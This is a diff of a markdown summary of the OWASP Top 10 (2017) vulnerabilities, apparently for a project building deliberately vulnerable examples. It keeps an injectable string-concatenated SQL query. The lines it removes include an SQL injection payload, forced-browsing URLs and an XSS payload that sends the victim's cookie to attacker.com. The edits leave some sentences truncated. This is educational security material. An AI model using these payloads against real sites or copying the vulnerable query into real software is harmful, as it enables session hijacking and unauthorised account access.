@@ -33,10 +33,9 @@ User-supplied data is not validated, filtered, or sanitized by the application.
 An application uses untrusted data in the construction of the following vulnerable SQL call:
 String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
 
-The attacker modifies the ‘id’ parameter value in their browser to send: ‘ or ‘1’=’1.
-For example: http://example.com/app/accountView?id=' or '1'='1
+The attacker modifies the ‘id’ parameter value in their browser to send: ‘1’=’1.
 
-**More on the subject:** [owasp-injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
+**More on the subject:** [owasp - injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
 
 ## 2. Broken Authentication
 
@@ -64,7 +63,7 @@ Application session timeouts aren’t set properly. A user uses a public compute
 
 Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords. 
 
-**More on the subject:** [Owasp - broken authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
+**More on the subject:** [owasp - broken authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
 
 ## 3. Sensitive Data Exposure (seems too hard to implement)
 
@@ -72,7 +71,7 @@ Most authentication attacks occur due to the continued use of passwords as a sol
 
 ## 4. XML External Entities (XXE) (seems too hard to implement)
 
-More on the subject: https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)
+More on the subject: [owasp - xml](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE))
 
 ## 5. Broken Access Control
 
@@ -91,11 +90,8 @@ pstmt.setString(1, request.getParameter("acct"));
 ResultSet results = pstmt.executeQuery( );
 
 An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
-http://example.com/app/accountInfo?acct=notmyacct
 
 An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
-http://example.com/app/getappInfo
-http://example.com/app/admin_getappInfo
 
 If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.
 
@@ -131,14 +127,7 @@ The application or API includes unvalidated and unescaped user input as part of 
 
 **Examples:**
 
-The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
-(String) page += "<input name='creditcard' type='TEXT'
-value='" + request.getParameter("CC") + "'>";
-
-The attacker modifies the ‘CC’ parameter in the browser to:
-'><script>document.location=
-'http://www.attacker.com/cgi-bin/cookie.cgi?
-foo='+document.cookie</script>'.
+The application uses untrusted data in the construction of the following HTML snippet without validation or escaping
 
 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
 
@@ -148,7 +137,7 @@ Note: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (
 
 ## 8. Insecure Deserialization  (seems too hard to implement)
 
-*More on the subject:** https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization
+*More on the subject:** [owasp - insecure deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization)
 
 ## 9. Using Components with Known Vulnerabilities
 
